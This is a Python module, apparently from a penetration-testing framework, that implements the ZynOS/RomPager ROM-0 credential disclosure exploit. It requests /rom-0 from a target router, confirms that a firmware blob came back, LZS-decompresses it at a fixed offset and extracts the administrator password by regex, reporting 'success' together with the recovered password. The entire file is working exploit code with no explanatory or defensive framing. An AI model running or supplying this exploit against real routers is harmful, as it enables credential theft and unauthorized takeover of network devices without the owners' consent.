#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
from typing import Any, Dict, Optional, Union

from core.framework.base_module import BaseModule
from lib.utils.lzs import LZSDecompress

ROM0_PATH = "/rom-0"
ROM0_DEFAULT_OFFSET = 8568
_ROM0_MIN_SIZE = 500
_PASSWORD_RE = re.compile(r"([\040-\176]{5,})")


class Rom0(BaseModule):
    """Shared helpers for ZynOS / RomPager ROM-0 admin password disclosure."""

    @staticmethod
    def rom0_looks_like_blob(content: Union[bytes, bytearray, str, None]) -> bool:
        if content is None:
            return False
        if isinstance(content, str):
            sample = content[:512].lower()
            return "<html" not in sample and len(content) > _ROM0_MIN_SIZE
        return len(content) > _ROM0_MIN_SIZE and b"<html" not in content[:512].lower()

    @staticmethod
    def rom0_extract_password(
        data: Union[bytes, bytearray],
        offset: int = ROM0_DEFAULT_OFFSET,
    ) -> Optional[str]:
        if not data or len(data) <= offset:
            return None

        try:
            decompressed, _window = LZSDecompress(data[offset:])
        except (IndexError, ValueError):
            return None

        matches = _PASSWORD_RE.findall(decompressed)
        if not matches:
            return None
        return matches[0]

    def rom0_fetch(self, timeout: int = 10) -> Optional[Any]:
        return self.http_request(
            method="GET",
            path=ROM0_PATH,
            timeout=timeout,
        )

    def rom0_probe(self, timeout: int = 10) -> Dict[str, Any]:
        try:
            response = self.rom0_fetch(timeout=timeout)
        except Exception as exc:
            return {"status": "error", "reason": f"Request failed: {exc}"}

        if response is None:
            return {"status": "error", "reason": "No response from target"}

        status_code = int(getattr(response, "status_code", 0) or 0)
        content = getattr(response, "content", b"") or b""

        if status_code != 200:
            return {
                "status": "not_found",
                "reason": f"/rom-0 returned HTTP {status_code}",
                "status_code": status_code,
            }

        if not self.rom0_looks_like_blob(content):
            return {
                "status": "not_vulnerable",
                "reason": "Response does not look like a ROM-0 firmware blob",
                "status_code": status_code,
                "size": len(content),
            }

        return {
            "status": "vulnerable",
            "reason": f"ROM-0 blob reachable ({len(content)} bytes)",
            "status_code": status_code,
            "content": content,
            "size": len(content),
        }

    def rom0_extract_from_target(
        self,
        offset: int = ROM0_DEFAULT_OFFSET,
        timeout: int = 10,
    ) -> Dict[str, Any]:
        probe = self.rom0_probe(timeout=timeout)
        status = probe.get("status")

        if status != "vulnerable":
            return probe

        content = probe.get("content") or b""
        password = self.rom0_extract_password(content, offset=offset)
        if not password:
            return {
                "status": "extract_failed",
                "reason": "ROM-0 downloaded but admin password could not be parsed",
                "size": probe.get("size"),
            }

        return {
            "status": "success",
            "reason": "Admin password extracted from ROM-0",
            "password": password,
            "size": probe.get("size"),
        }
